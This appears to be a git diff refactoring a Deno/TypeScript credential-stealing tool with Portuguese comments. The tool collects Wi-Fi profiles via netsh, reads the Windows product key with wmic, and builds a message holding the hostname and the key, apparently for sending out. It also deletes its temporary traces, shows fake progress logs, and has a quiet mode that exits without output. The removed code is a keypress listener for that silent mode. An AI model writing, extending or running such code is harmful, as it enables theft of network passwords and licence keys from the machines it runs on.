@@ -1,21 +1,12 @@
-import { checkDirs, clearTags, getHTML, getNow, random } from './Functions.ts';
-import { SpinnerTypes, TerminalSpinner } from '@spinners';
-import { keypress } from '@cliffy/keypress';
-import { qrcode } from '@qrcode';
-import { delay } from '@std';
-import colors from '@colors';
-import $ from '@dax';
+import { checkDirs, clearTags, getHTML, getNow, showLogs, sleep } from './Util.ts';
+import { SpinnerTypes, TerminalSpinner } from 'spinners';
+import { qrcode } from 'qrcode';
+import colors from 'colors';
+import $ from 'dax';
 
-let showLogs = !Deno.args.includes('-q');
 let key = ''; // Windows License Key
 let c = 0; // network counter
 colors;
-
-// Função intermediária para delay();
-const sleep = (timeout: number) => showLogs && delay(timeout);
-
-//  Ativa o Listener para o teclado
-silentMode();
 
 // Verifica se todas as pastas necessárias foram criadas
 await checkDirs();
@@ -23,7 +14,7 @@ await checkDirs();
 // 'Title.txt' contém uma string bem cringe
 const title: string = await Deno.readTextFile('data/Title.txt').catch(() => '');
 
-showLogs && console.log(title.text_bold.red);
+showLogs() && console.log('%c' + title, 'color: red');
 
 class Spinner {
 	sector: string;
@@ -35,7 +26,7 @@ class Spinner {
 		this.text = text;
 
 		// Inicia Spinner
-		showLogs &&
+		showLogs() &&
 			(this.spinner = new TerminalSpinner({
 				text: this._format(),
 				spinner: {
@@ -79,7 +70,7 @@ await copyWinKey();
 await Deno.remove('temp', { recursive: true }).catch(() => {});
 // 'recursive' significa que é pra apagar mesmo se tiver arquivos dentro
 
-!showLogs && Deno.exit();
+!showLogs() && Deno.exit();
 
 async function NetSHProfileCollector() {
 	// sem await pra exibir os logs enquanto copia os dados
@@ -123,9 +114,8 @@ async function NetSHProfileCollector() {
 }
 
 async function copyWinKey() {
-	key =
-		(await $`wmic path softwarelicensingservice get OA3xOriginalProductKey`
-			.lines())[1].trim();
+	key = (await $`wmic path softwarelicensingservice get OA3xOriginalProductKey`
+		.lines())[1].trim();
 
 	const body = `
 	Máquina: <s${Deno.hostname()}s>
@@ -152,32 +142,22 @@ async function createFakeLogs() {
 	// Exibe status fakes pra impressionar leigos
 	for (const msg of fakeLogs) {
 		spinner = new Spinner('Wi-Fi CLONER', msg[0]);
-		await sleep(random());
+		await sleep();
 		spinner.end(msg[1]);
 	}
 
 	spinner = new Spinner('Wi-Fi CLONER', 'Clonando redes Wi-Fi...');
-	await sleep(random(1_000, 3_000));
+	await sleep(1_500, 3_000);
 	spinner.end(`${c} redes clonadas.`.text_underscore.bg_red.white);
 
 	spinner = new Spinner('KEY CLONER', 'Obtendo chave de ativação...');
-	await sleep(random());
+	await sleep();
 	spinner.end(`Chave de ativação: ${key.text_underscore.bg_red.white}`);
 
 	spinner = new Spinner('CLEANER', 'Apagando registros...');
-	await sleep(random());
+	await sleep();
 	spinner.end('Registros excluídos.');
-	await sleep(random(1_500, 3_000));
+	await sleep(1_500, 3_000);
 
-	showLogs && Deno.exit();
-}
-
-async function silentMode() {
-	for await (const event of keypress()) {
-		if (event.key === 'escape') Deno.exit();
-
-		// quando a tecla S for pressionada
-		if (event.key === 's') showLogs = false;
-		// ativa o silent mode
-	}
+	showLogs() && Deno.exit();
 }
